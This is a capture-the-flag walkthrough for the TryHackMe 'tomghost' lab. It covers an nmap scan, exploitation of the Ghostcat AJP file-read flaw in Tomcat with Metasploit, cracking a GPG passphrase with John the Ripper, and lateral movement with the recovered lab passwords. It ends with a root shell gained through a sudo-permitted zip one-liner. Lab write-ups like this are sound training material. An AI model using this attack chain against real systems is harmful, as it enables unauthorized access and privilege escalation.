# Recon 

`echo "10.82.168.92     tomghost.thm" >> /etc/hosts`
`sudo nmap -A -T4 tomghost.thm`

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=2/19%OT=22%CT=1%CU=44015%PV=Y%DS=3%DC=T%G=Y%TM=699711E
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%II=I%TS=8)SEQ(SP=1
OS:02%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%
OS:II=I%TS=8)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)SEQ(SP=108%GCD=1%
OS:ISR=108%TI=Z%CI=I%II=I%TS=8)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT
OS:11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=68DF%W2=68DF%W3=6
OS:8DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW7%CC=Y%Q
OS:=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   294.99 ms 192.168.128.1
2   ...
3   295.05 ms tomghost.thm (10.82.168.92)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.53 seconds
```

# Arbitrary File Read & Exposure of Sensitive Information to an Unauthorized Actor

> Apache JServ Protocol (AJP) connections are treated by Tomcat with higher trust than a similar HTTP connection; and by default AJP connector is enabled to listen on all configured IP addresses, allowing arbitrary file reads, where any file within the web application can be processed as a JSP. Remote Code Execution (RCE) is possible if file upload to the storage of the web app is allowed, or if an attacker can control the web application's content in another way

`msfconsole -q`
`use auxiliary/admin/http/tomcat_ghostcat`
    `set RHOSTS tomghost.thm`
`run`

Credentials obtained: 
```
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
```

# Initial Access

`ssh skyfuck@tomghost.thm`
password: `8730281lkjlkjdqlksalks`


- List content of current directory with `ls` 
```
credential.pgp
tryhackme.asc
```
- An attempt to import the key `tryhackme.asc` using the gpg utility results in a prompt for a password: `gpg --import tryhackme.asc`

Let's try to crack the password with GPG2John:

- Convert the key into a hash: `gpg2john tryhackme.asc > hash.txt`
- Use JohnTheRipper to crack the hash: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
- Output from John: `alexandru`

Now let's import the .asc key and decrypt the pgp file. 
`gpg --import tryhackme.asc`
`gpg --decrypt credential.pgp`

# Lateral Movement

`ssh merlin@tomghost.thm`
password: `asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

User flag obtained. 

# Privilege Escalation

Dropped linpeas.sh onto the /tmp directory of the target and ran the script to enumerate privilege escalation vectors. 

Merlin has sudo privileges for `zip`

```
User merlin may run the following commands on ubuntu:                                                                                                                                                                                        
    (root : root) NOPASSWD: /usr/bin/zip
```
> GTFOBins can be referenced for this, as it is a "curated list of Unix-like executables that can be abused to break out restricted shells, escalate or maintain elevated privileges..."
`sudo zip exploit.zip /tmp -T -TT '/bin/sh #'`

And we have root! Root flag obtained.
